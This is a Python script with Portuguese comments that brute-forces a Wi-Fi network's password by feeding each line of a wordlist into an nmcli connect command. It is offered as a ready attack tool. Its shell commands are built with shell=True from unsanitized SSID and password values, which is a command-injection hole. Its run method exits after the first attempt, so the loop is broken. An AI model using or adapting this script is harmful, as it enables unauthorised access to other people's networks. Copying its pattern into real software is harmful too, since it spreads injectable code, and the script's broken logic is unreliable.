
# Class principal
class Finder:
    def __init__(self, *args, **kwargs):
        self.server_name = kwargs['server_name']
        self.password = kwargs['password']
        self.interface_name = kwargs['interface']
        self.main_dict = {}
        

    def run(self):

        name = self.server_name
        # testa senha
        try:
            result = self.connection(name)
        except Exception as exp:
            print("Senha invalida!")
        else:
            if result:
                print(f'Sucesso! A rede com nome: {name}')
                print("********************************")
                print(f'Utiliza a senha: {self.password}')
        exit(0)

    # Cria subprocesso para tentar se logar no wifi com a senha
    def connection(self, name):
        try:
            output = subprocess.check_output(f'nmcli device wifi connect {self.server_name} password {self.password} ifname {self.interface_name}', shell=True)
        except:
            raise
        else:
            return True
    

if __name__ == '__main__':
    import os
    import subprocess
    import optparse
    import time

    print('[*] Lista das redes wi-fi disponíveis no momento [*]\n')
    wlan = subprocess.check_output('nmcli device wifi',shell=True)
    wlan = str(wlan).replace('\\','\n')
    print(wlan)
    print(50*'-')
    time.sleep(1)
    parser = optparse.OptionParser('Utilize o progrma: -d <Nome da rede wi-fi> -w <wordlista> -i <Interface de rede> ')
    parser.add_option('-d', dest='server_name', type='string', help="Informar o nome da rede wi-fi")
    parser.add_option('-w', dest='wordlist', type='string', help='Informe a wordlista desejada')
    parser.add_option('-i', dest='network', type='string', help='Defina a interface de rede a ser utilizada')
    
    (options, args) = parser.parse_args()
    if options.network == None or options.wordlist == None or options.server_name == None:
        print(parser.usage)
        exit(0)
    else:
        interface = options.network
        rede = options.server_name
        wordlist = options.wordlist

        # Nome da Rede Wifi
        server_name = rede.lstrip()
        lista = wordlist.strip()
        # arquivo contendo as senhas
        f = open(lista, "r")
        txt = f.read()
        passwords = txt.splitlines()
        
        # define interface de rede wifi
        interface_name = interface.strip()
        print(f'Vamos testar {len(passwords)} senhas!\n')
        for password in passwords:
            print(f'Testando senha: {password}')
            F = Finder(server_name=server_name, password=password,interface=interface_name)
            F.run()
        
        
            


